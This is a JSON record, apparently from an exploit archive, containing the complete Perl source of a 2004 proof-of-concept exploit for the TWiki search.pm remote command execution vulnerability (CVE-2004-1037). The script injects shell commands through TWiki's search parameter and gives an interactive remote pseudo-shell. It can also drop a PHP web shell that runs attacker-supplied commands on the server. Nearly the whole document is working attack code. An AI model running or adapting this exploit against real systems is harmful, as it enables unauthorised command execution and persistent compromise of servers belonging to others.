{
  "id": "642",
  "title": "TWiki 20030201 - &#039;search.pm&#039; Remote Command Execution",
  "cve": "CVE-2004-1037",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n# \"tweaky.pl\" v. 1.0 beta 2\r\n#\r\n# Proof of concept for TWiki vulnerability. Remote code execution\r\n# Vuln discovered, researched and exploited by RoMaNSoFt <roman rs-labs com>\r\n#\r\n# Madrid, 30.Sep.2004.\r\n\r\n\r\nrequire LWP::UserAgent;\r\nuse Getopt::Long;\r\n\r\n### Default config\r\n$host = '';\r\n$path = '/cgi-bin/twiki/search/Main/';\r\n$secure = 0;\r\n$get = 0;\r\n$post = 0;\r\n$phpshellpath='';\r\n$createphpshell = '(echo `perl -e \\'print chr(60).chr(63)\\'` ; echo \\'$out = shell_exec($_GET[\"cmd\"].\r\n\" 2\\'`perl -e \\'print chr(62).chr(38)\\'`\\'1\");\\' ; echo \\'echo \"\\'`perl -e \\'print chr(60).\"pre\".chr(62).\"\\\\\\\\\r\n$out\".chr(60).\"/pre\".chr(62)\\'`\\'\";\\' ; echo `perl -e \\'print chr(63).chr(62)\\'`) | tee ';\r\n$logfile = ''; # If empty, logging will be disabled\r\n$prompt = \"tweaky\\$ \";\r\n$useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)';\r\n$proxy = '';\r\n$proxy_user = '';\r\n$proxy_pass = '';\r\n$basic_auth_user = '';\r\n$basic_auth_pass = '';\r\n$timeout = 30;\r\n$debug = 0;\r\n$init_command = 'uname -a ; id';\r\n$start_mark = 'AAAA';\r\n$end_mark = 'BBBB';\r\n$pre_string = 'nonexistantttt\\' ; (';\r\n$post_string = ') | sed \\'s/\\(.*\\)/'.$start_mark.'\\1'.$end_mark.'.txt/\\' ; fgrep -i -l -- \\'nonexistantttt';\r\n$delim_start = '<b>'.$start_mark;\r\n$delim_end = $end_mark.'</b>';\r\n\r\nprint \"Proof of concept for TWiki vulnerability. Remote code execution.\\n\";\r\nprint \"(c) RoMaNSoFt, 2004. <roman\\@rs-labs.com>\\n\\n\";\r\n\r\n### User-supplied config (read from the command-line)\r\n$parsing_ok = GetOptions ('host=s' => \\$host,\r\n'path=s' => \\$path,\r\n'secure' => \\$secure,\r\n'get' => \\$get,\r\n'post' => \\$post,\r\n'phpshellpath=s' => \\$phpshellpath,\r\n'logfile=s' => \\$logfile,\r\n'init_command=s' => \\$init_command,\r\n'useragent=s' => \\$useragent,\r\n'proxy=s' => \\$proxy,\r\n'proxy_user=s' => \\$proxy_user,\r\n'proxy_pass=s' => \\$proxy_pass,\r\n'basic_auth_user=s' => \\$basic_auth_user,\r\n'basic_auth_pass=s' => \\$basic_auth_pass,\r\n'timeout=i' => \\$timeout,\r\n'debug' => \\$debug,\r\n'start_mark=s' => \\$start_mark,\r\n'end_mark=s' => \\$end_mark);\r\n\r\n### Some basic checks\r\n&banner unless ($parsing_ok);\r\n\r\nif ($get and $post) {\r\nprint \"Choose one only method! (GET or POST)\\n\\n\";\r\n&banner;\r\n}\r\n\r\nif (!($get or $post)) {\r\n# If not specified we prefer POST method\r\n$post = 1;\r\n}\r\n\r\nif (!$host) {\r\nprint \"You must specify a target hostname! (tip: --host <hostname>)\\n\\n\" ;\r\n&banner;\r\n}\r\n\r\n$url = ($secure ? 'https' : 'http') . \"://\" . $host . $path;\r\n\r\n### Checking for a vulnerable TWiki\r\n&run_it ($init_command, 'RS-Labs rlz!');\r\n\r\n### Execute selected payload\r\n\r\nif ($phpshellpath) {\r\n&create_phpshell;\r\nprint \"PHPShell created.\";\r\n} else {\r\n&pseudoshell;\r\n}\r\n\r\n### End\r\nexit(0);\r\n\r\n\r\n### Create PHPShell\r\nsub create_phpshell {\r\n$createphpshell .= $phpshellpath;\r\n&run_it($createphpshell, 'yeah!');\r\n}\r\n\r\n\r\n### Pseudo-shell\r\nsub pseudoshell {\r\nopen(LOGFILE, \">>$logfile\") if $logfile;\r\nopen(STDINPUT, '-');\r\n\r\nprint \"Welcome to RoMaNSoFt's pseudo-interactive shell :-)\\n[Type Ctrl-D or (bye, quit, exit, logout) to exit]\\n\r\n\\n\".$prompt.$init_command.\"\\n\";\r\n&run_it ($init_command);\r\nprint $prompt;\r\n\r\nwhile (<STDINPUT>) {\r\nchop;\r\nif ($_ eq \"bye\" or $_ eq \"quit\" or $_ eq \"exit\" or $_ eq \"logout\") {\r\nexit(1);\r\n}\r\n\r\n&run_it ($_) unless !$_;\r\nprint \"\\n\".$prompt;\r\n}\r\n\r\nclose(STDINPUT);\r\nclose(LOGFILE) if $logfile;\r\n}\r\n\r\n\r\n### Print banner and die\r\nsub banner {\r\nprint \"Syntax: ./tweaky.pl --host=<host> [options]\\n\\n\";\r\nprint \"Proxy options: --proxy=http://proxy:port --proxy_user=foo --proxy_pass=bar\\n\";\r\nprint \"Basic auth options: --basic_auth_user=foo --basic_auth_pass=bar\\n\";\r\nprint \"Secure HTTP (HTTPS): --secure\\n\";\r\nprint \"Path to CGI: --path=$path\\n\";\r\nprint \"Method: --get | --post\\n\";\r\nprint \"Enable logging: --logfile=/path/to/a/file\\n\";\r\nprint \"Create PHPShell: --phpshellpath=/path/to/phpshell\\n\";\r\n\r\nexit(1);\r\n}\r\n\r\n\r\n### Execute command via vulnerable CGI\r\nsub run_it {\r\nmy ($command, $testing_vuln) = @_;\r\nmy $req;\r\nmy $ua = new LWP::UserAgent;\r\n\r\n$ua->agent($useragent);\r\n$ua->timeout($timeout);\r\n\r\n# Build CGI param and urlencode it\r\nmy $search = $pre_string . $command . $post_string;\r\n$search =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n\r\n# Case GET\r\nif ($get) {\r\n$req = HTTP::Request->new('GET', $url . \"?scope=text&order=modified&search=$search\");\r\n}\r\n\r\n# Case POST\r\nif ($post) {\r\n$req = new HTTP::Request POST => $url;\r\n$req->content_type('application/x-www-form-urlencoded');\r\n$req->content(\"scope=text&order=modified&search=$search\");\r\n}\r\n\r\n# Proxy definition\r\nif ($proxy) {\r\nif ($secure) {\r\n# HTTPS request\r\n$ENV{HTTPS_PROXY} = $proxy;\r\n$ENV{HTTPS_PROXY_USERNAME} = $proxy_user;\r\n$ENV{HTTPS_PROXY_PASSWORD} = $proxy_pass; \r\n} else {\r\n# HTTP request\r\n$ua->proxy(['http'] => $proxy);\r\n$req->proxy_authorization_basic($proxy_user, $proxy_pass); \r\n}\r\n}\r\n\r\n# Basic Authorization\r\n$req->authorization_basic($basic_auth_user, $basic_auth_pass) if ($basic_auth_user);\r\n\r\n# Launch request and parse results\r\nmy $res = $ua->request($req);\r\n\r\nif ($res->is_success) {\r\n\r\nprint LOGFILE \"\\n\".$prompt.$command.\"\\n\" if ($logfile and !$testing_vuln);\r\n@content = split(\"\\n\", $res->content);\r\n\r\nmy $empty_response = 1;\r\n\r\nforeach $_ (@content) {\r\nmy ($match) = ($_ =~ /$delim_start(.*)$delim_end/g);\r\n\r\nif ($debug) {\r\nprint $_ . \"\\n\";\r\n} else {\r\nif ($match) {\r\n$empty_response = 0;\r\nprint $match . \"\\n\" unless ($testing_vuln);\r\n}\r\n}\r\n\r\nprint LOGFILE $match . \"\\n\" if ($match and $logfile and !$testing_vuln);\r\n}\r\n\r\nif ($empty_response) {\r\nif ($testing_vuln) {\r\ndie \"Sorry, exploit didn't work!\\nPerhaps TWiki is patched or you supplied a wrong URL \r\n(remember it should point to Twiki's search page).\\n\";\r\n} else {\r\nprint \"[Server issued an empty response. Perhaps you entered a wrong command?]\\n\";\r\n}\r\n}\r\n\r\n} else {\r\ndie \"Couldn't connect to server. Error message follows:\\n\" . $res->status_line . \"\\n\";\r\n} \r\n}\r\n\r\n# milw0rm.com [2004-11-20]",
  "url": "https://www.exploit-db.com/exploits/642"
}